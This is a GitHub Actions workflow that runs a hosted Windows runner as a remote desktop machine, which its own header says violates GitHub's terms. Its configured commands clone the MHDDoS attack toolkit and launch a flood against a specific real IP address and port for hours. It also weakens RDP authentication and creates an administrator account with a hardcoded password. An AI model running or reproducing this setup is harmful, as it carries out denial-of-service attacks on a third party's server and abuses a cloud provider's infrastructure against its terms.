# =====================================================================
#  Windows Cloud RDP
# ---------------------------------------------------------------------
#  NOTE: GitHub-hosted runners are for CI only. Using them as a remote
#  desktop box violates the GitHub Actions ToS and can get the account
#  suspended.
#
#  What's in here now:
#    1  Enable RDP / firewall / UDP / power plan
#    2  Create Admin Account
#    3  Run SETUP_CMD (config below, e.g. git clone)
#    4  One persistent CMD window with your 4 custom commands
#    5  Leftover Tailscale installer cache (harmless)
#    6  Keep-alive loop
# =====================================================================
name: Windows Cloud RDP

on:
  workflow_dispatch:

env:
  # ==================================================================
  #  >>> USER CONFIG - EDIT THESE LINES <<<
  # ==================================================================
  #  SETUP_CMD: one-time command that runs during setup, before the
  #  CMD window opens. Output shows up in the Actions job log.
  #  Leave blank ("") to skip.
  #
  #  Examples:
  #    SETUP_CMD: git clone https://github.com/yourname/repo.git D:\repo
  #    SETUP_CMD: curl -L -o D:\tool.zip https://example.com/tool.zip
  #
  SETUP_CMD: "git clone https://github.com/MatrixTM/MHDDoS.git"
  #
  #  CMD_1..CMD_4: your custom commands. ALL of them run inside ONE
  #  single cmd window on the desktop (you'll see it when you connect
  #  over RDP), from top to bottom, and that window STAYS OPEN after
  #  they finish (cmd /k) - so you can keep typing in it.
  #
  #  Notes:
  #    - Blank lines are skipped.
  #    - Commands run in order; if one blocks forever (e.g. starts a
  #      server), the lines after it wait -> put long-running stuff
  #      on the LAST line.
  #
  #  Example:
  #    CMD_1: cd /d D:\repo
  #    CMD_2: npm install
  #    CMD_3: ipconfig /all
  #    CMD_4: ping -t 8.8.8.8
  #
  CMD_1: "cd MHDDoS"
  CMD_2: "pip install -r requirements.txt"
  CMD_3: "python start.py TS3 212.33.201.77:5933 999 9000"
  CMD_4: "echo done"
  # ==================================================================
  PERSIST_DIR: D:\Persist
  BACKUP_DIR: D:\_backup
  BACKUP_FILE: D:\_backup\dstate.7z
  # How often (in minutes) the live snapshot of D:\Persist is refreshed.
  SNAPSHOT_EVERY_MIN: 15
  # Keep-alive length. Hosted jobs are hard-killed at 6 h, so we stop a
  # bit earlier and exit cleanly.
  KEEPALIVE_MINUTES: 340

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 355

    steps:
      # ---------------------------------------------------------------
      - name: 1. Enable RDP, Firewall, UDP Transport & Performance Tuning
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-UDP" -ErrorAction SilentlyContinue
          Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-TCP" -ErrorAction SilentlyContinue
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
          $tsPol = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
          New-Item -Path $tsPol -Force | Out-Null
          Set-ItemProperty -Path $tsPol -Name "SelectTransport" -Value 1 -Type DWord -Force   # Allow UDP + TCP
          Set-ItemProperty -Path $tsPol -Name "ColorDepth" -Value 24 -Type DWord -Force
          Set-ItemProperty -Path $tsPol -Name "fCompressionEnabled" -Value 1 -Type DWord -Force
          powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
          Write-Host ">>> RDP enabled (UDP transport) + High Performance power plan." -ForegroundColor Green
      # ---------------------------------------------------------------
      - name: 2. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "Cynet@2026" -AsPlainText -Force
          New-LocalUser -Name "CynetAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "CynetAdmin" -ErrorAction SilentlyContinue
          net user runneradmin Cynet@2026
      # ---------------------------------------------------------------
      #  Runs SETUP_CMD from the config block (e.g. a git clone).
      #  Written to a temp .cmd file first so any quotes / special
      #  characters in your command survive.
      # ---------------------------------------------------------------
      - name: "3. Run SETUP_CMD (config)"
        shell: powershell
        run: |
          if ([string]::IsNullOrWhiteSpace($env:SETUP_CMD)) {
            Write-Host ">>> SETUP_CMD is empty - skipping. Set it in the env config, e.g.:" -ForegroundColor Yellow
            Write-Host "      git clone https://github.com/yourname/repo.git D:\repo" -ForegroundColor Yellow
          } else {
            Write-Host ">>> Running SETUP_CMD: $env:SETUP_CMD" -ForegroundColor Cyan
            $tmp = "$env:TEMP\setup-cmd.cmd"
            Set-Content -Path $tmp -Value $env:SETUP_CMD -Encoding ascii
            cmd /c $tmp
            $rc = $LASTEXITCODE
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
            Write-Host ">>> SETUP_CMD finished (exit code $rc)."
            if ($rc -ne 0) { Write-Host "    (non-zero exit - check the command)" -ForegroundColor Yellow }
          }
      # ---------------------------------------------------------------
      #  Builds a .cmd file from CMD_1..CMD_4 and opens it in ONE cmd
      #  window on the desktop with /k -> the commands run one after
      #  another and the window DOES NOT close afterwards.
      # ---------------------------------------------------------------
      - name: "4. Persistent CMD window (custom commands)"
        shell: powershell
        run: |
          # collect the 4 config lines, skip blanks
          $cmds = @($env:CMD_1, $env:CMD_2, $env:CMD_3, $env:CMD_4) |
                  Where-Object { -not [string]::IsNullOrWhiteSpace($_) }

          # put the script on the Desktop so it's right there in RDP
          $bat = Join-Path ([Environment]::GetFolderPath('Desktop')) 'custom-cmds.cmd'
          if (-not (Test-Path (Split-Path $bat))) { $bat = 'C:\custom-cmds.cmd' }

          $content = @(
            '@echo off'
            'title Custom Commands (this window stays open)'
            'cd /d %USERPROFILE%'
          )
          if ($cmds.Count -eq 0) {
            $content += 'echo No custom commands set - edit CMD_1..CMD_4 in the workflow env config.'
          } else {
            $content += $cmds
          }
          $content += @(
            'echo.'
            'echo =================================================='
            'echo  Custom commands finished - this CMD window STAYS OPEN.'
            'echo =================================================='
          )
          Set-Content -Path $bat -Value $content -Encoding ascii

          Write-Host ">>> Launching ONE persistent cmd window running: $bat" -ForegroundColor Cyan
          Write-Host ($content | Out-String)

          # /k = window stays open after the script finishes
          Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$bat`""
          Write-Host ">>> CMD window spawned - you'll see it when you connect via RDP." -ForegroundColor Green
      # ---------------------------------------------------------------
      #  LEFTOVER from the removed step 4 (Tailscale install). Harmless,
      #  but caches nothing since C:\tailscale.msi is never created now.
      # ---------------------------------------------------------------
      - name: 5. Cache Tailscale Installer (leftover)
        id: ts-cache
        uses: actions/cache@v4
        with:
          path: C:\tailscale.msi
          key: tailscale-msi-v1
      # ---------------------------------------------------------------
      #  NOTE: the snapshot below survives, but the restore/save steps
      #  were removed earlier, so the archive it builds is never
      #  uploaded or reused. Harmless - it's just there.
      # ---------------------------------------------------------------
      - name: "6. Keep Server Alive + periodic D: snapshot"
        shell: powershell
        run: |
          $7z    = "C:\Program Files\7-Zip\7z.exe"
          $total = [int]$env:KEEPALIVE_MINUTES
          $every = [int]$env:SNAPSHOT_EVERY_MIN
          New-Item -ItemType Directory -Force -Path "$env:BACKUP_DIR" | Out-Null
          for ($i = 1; $i -le $total; $i++) {
            Start-Sleep -Seconds 60
            if ($i % $every -eq 0 -or $i -eq $total) {
              $tmp = "$env:BACKUP_DIR\dstate.tmp.7z"
              Remove-Item $tmp -Force -ErrorAction SilentlyContinue
              # -mx=1 fast compression, -ssw include files in use
              & $7z a -t7z -mx=1 -ssw -bso0 -bsp0 $tmp "$env:PERSIST_DIR" `
                    "-xr!*.log" "-xr!Crashpad" "-xr!Cache" "-xr!logs" 2>$null
              if (Test-Path $tmp) {
                Move-Item $tmp "$env:BACKUP_FILE" -Force
                $mb = [math]::Round((Get-Item "$env:BACKUP_FILE").Length/1MB,1)
                Write-Host "[$i/$total] snapshot updated ($mb MB)" -ForegroundColor DarkCyan
              }
            } else {
              Write-Host "[$i/$total] Server running..."
            }
          }
